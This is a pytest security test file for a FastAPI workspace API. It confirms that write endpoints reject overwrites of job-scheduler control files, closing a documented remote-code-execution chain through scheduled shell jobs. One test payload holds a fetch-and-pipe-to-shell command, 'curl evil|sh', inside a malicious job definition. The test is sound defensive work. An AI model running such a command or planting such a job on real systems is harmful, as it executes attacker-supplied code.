"""Security test: the workspace write API must not overwrite job-system control
files (TT V2265734761, fix 3 — root-cause form).

The RCE chain's write link is: PUT /api/workspace/{id}/write overwrites
Services/swarm-jobs/user-jobs.yaml → the scheduler loads it → executor runs a
script job (or a type=agent_task job's fallback_script) via
subprocess.run(shell=True). Rather than reject a legitimate on-disk job TYPE at
load (which breaks the 5+ real enabled user script jobs AND misses the
fallback_script path), we close the ROOT cause: the HTTP write boundary refuses
to write the job-control files themselves. Legitimate user script jobs authored
directly on disk keep working.

Methodology: FastAPI TestClient PUT, with the cached workspace path and the
job-control file constants monkeypatched into a tmp tree so no real user data or
job config is touched.
"""

from pathlib import Path

import pytest
from fastapi.testclient import TestClient

from routers import workspace as ws


@pytest.fixture
def tmp_ws(tmp_path, monkeypatch):
    """A tmp workspace whose Services/swarm-jobs/ holds the job-control files."""
    workspace = tmp_path / "SwarmWS"
    jobs_dir = workspace / "Services" / "swarm-jobs"
    jobs_dir.mkdir(parents=True)
    user_jobs = jobs_dir / "user-jobs.yaml"
    config_yaml = jobs_dir / "config.yaml"
    state_json = jobs_dir / "state.json"
    for f in (user_jobs, config_yaml, state_json):
        f.write_text("original\n", encoding="utf-8")

    monkeypatch.setattr(
        "core.initialization_manager.initialization_manager.get_cached_workspace_path",
        lambda: str(workspace),
    )
    # The sibling router (workspace_api) resolves the workspace via its own
    # DB-backed _get_workspace_path — patch it to the same tmp workspace.
    async def _fake_ws_path():
        return str(workspace)
    monkeypatch.setattr("routers.workspace_api._get_workspace_path", _fake_ws_path)
    # is_protected_job_file compares against these module constants at call time,
    # so patching the module attributes is honored across both routers.
    monkeypatch.setattr("jobs.paths.USER_JOBS_FILE", user_jobs)
    monkeypatch.setattr("jobs.paths.CONFIG_FILE", config_yaml)
    monkeypatch.setattr("jobs.paths.STATE_FILE", state_json)
    return workspace


def test_write_user_jobs_yaml_denied(client: TestClient, tmp_ws):
    """PUT to Services/swarm-jobs/user-jobs.yaml → 403, file unchanged."""
    resp = client.put(
        "/api/workspace/agent1/write",
        json={"path": "Services/swarm-jobs/user-jobs.yaml",
              "content": "jobs:\n- id: evil\n  type: script\n  schedule: '* * * * *'\n  config: {command: 'curl evil|sh'}\n"},
    )
    assert resp.status_code == 403, resp.text
    assert (tmp_ws / "Services" / "swarm-jobs" / "user-jobs.yaml").read_text() == "original\n"


def test_write_job_config_yaml_denied(client: TestClient, tmp_ws):
    """PUT to the job config.yaml → 403."""
    resp = client.put(
        "/api/workspace/agent1/write",
        json={"path": "Services/swarm-jobs/config.yaml", "content": "x: 1\n"},
    )
    assert resp.status_code == 403, resp.text


def test_write_job_state_json_denied(client: TestClient, tmp_ws):
    """PUT to the job state.json → 403."""
    resp = client.put(
        "/api/workspace/agent1/write",
        json={"path": "Services/swarm-jobs/state.json", "content": "{}\n"},
    )
    assert resp.status_code == 403, resp.text


def test_write_normal_file_allowed(client: TestClient, tmp_ws):
    """A normal in-workspace file write is unaffected (no false-block)."""
    resp = client.put(
        "/api/workspace/agent1/write",
        json={"path": "Knowledge/Notes/hello.md", "content": "# hi\n"},
    )
    assert resp.status_code == 200, resp.text
    assert (tmp_ws / "Knowledge" / "Notes" / "hello.md").read_text() == "# hi\n"


def test_write_other_services_file_allowed(client: TestClient, tmp_ws):
    """A non-control file elsewhere under Services/ is still writable — the deny
    is scoped to the exact job-control files, not all of Services/."""
    resp = client.put(
        "/api/workspace/agent1/write",
        json={"path": "Services/swarm-jobs/notes.txt", "content": "notes\n"},
    )
    assert resp.status_code == 200, resp.text


class TestSecondWriteEndpoint:
    """R27: the SAME job-control-file deny must hold on the sibling write
    endpoints in workspace_api.py (PUT + POST /api/workspace/file), not just
    workspace.py::write_file. Meta-review found these unguarded (would re-open
    the RCE write link)."""

    def test_put_workspace_file_user_jobs_denied(self, client: TestClient, tmp_ws):
        """PUT /api/workspace/file (workspace_api) → job-control file → 403."""
        resp = client.put(
            "/api/workspace/file",
            params={"path": "Services/swarm-jobs/user-jobs.yaml"},
            json={"content": "jobs:\n- id: evil\n  type: script\n"},
        )
        assert resp.status_code == 403, resp.text
        assert (tmp_ws / "Services" / "swarm-jobs" / "user-jobs.yaml").read_text() == "original\n"

    def test_post_workspace_file_create_user_jobs_denied(self, client: TestClient, tmp_ws, monkeypatch):
        """POST /api/workspace/file (create) → creating a job-control file → 403,
        even on a fresh install where the file does not yet exist."""
        # Remove the file so create's exists()->409 does not mask the deny.
        (tmp_ws / "Services" / "swarm-jobs" / "user-jobs.yaml").unlink()
        resp = client.post(
            "/api/workspace/file",
            json={"path": "Services/swarm-jobs/user-jobs.yaml"},
        )
        assert resp.status_code == 403, resp.text
        assert not (tmp_ws / "Services" / "swarm-jobs" / "user-jobs.yaml").exists()

    def test_put_workspace_file_normal_allowed(self, client: TestClient, tmp_ws):
        """A normal file via the sibling endpoint still writes (no false-block)."""
        resp = client.put(
            "/api/workspace/file",
            params={"path": "Knowledge/Notes/note.md"},
            json={"content": "# note\n"},
        )
        assert resp.status_code == 200, resp.text


def test_is_protected_job_file_helper(tmp_ws):
    """The shared SSOT helper: True for job-control files, False otherwise."""
    from jobs.paths import is_protected_job_file, USER_JOBS_FILE
    assert is_protected_job_file(USER_JOBS_FILE) is True
    assert is_protected_job_file(tmp_ws / "Knowledge" / "x.md") is False
